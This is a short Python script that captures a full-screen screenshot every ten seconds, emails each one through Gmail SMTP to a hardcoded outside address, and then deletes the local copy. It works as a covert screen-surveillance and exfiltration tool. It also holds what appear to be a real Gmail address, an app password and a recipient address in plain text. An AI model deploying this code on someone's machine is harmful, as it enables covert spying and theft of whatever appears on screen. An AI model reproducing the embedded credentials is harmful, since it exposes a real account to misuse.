import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from PIL import ImageGrab  # For capturing screenshots
import os
import time

def capture_screenshot():
    """Capture a screenshot and return the image path."""
    screenshot = ImageGrab.grab()  # Capture the screen
    image_path = 'screenshot.png'  # Path to save the screenshot
    screenshot.save(image_path)  # Save the screenshot
    return image_path

def send_email_with_image(email, password, to_email, subject, body, image_path):
    """Send an email with a screenshot attachment."""
    # Create a multipart email message
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = to_email
    msg['Subject'] = subject

    # Attach the email body
    msg.attach(MIMEText(body, 'plain'))

    # Attach the screenshot
    with open(image_path, 'rb') as img_file:
        img = MIMEImage(img_file.read())
        img.add_header('Content-Disposition', f'attachment; filename={os.path.basename(image_path)}')
        msg.attach(img)

    # Send the email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.send_message(msg)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Main function
def main():
    email = "tejasreea9182@gmail.com"  # Replace with your email
    password = "oblo eoqg nnuz xgkc"      # Replace with your password
    to_email = "tejasreea85@gmail.com"  # Replace with recipient's email
    subject = "Screenshot Attachment"
    body = "Please find the attached screenshot."

    try:
        while True:
            # Capture screenshot
            screenshot_path = capture_screenshot()
            
            # Send email with screenshot
            send_email_with_image(email, password, to_email, subject, body, screenshot_path)

            # Optional: Remove the screenshot after sending
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            
            # Wait for 10 seconds
            time.sleep(10)
    except KeyboardInterrupt:
        print("Process stopped by user.")

if __name__ == "__main__":
    main()
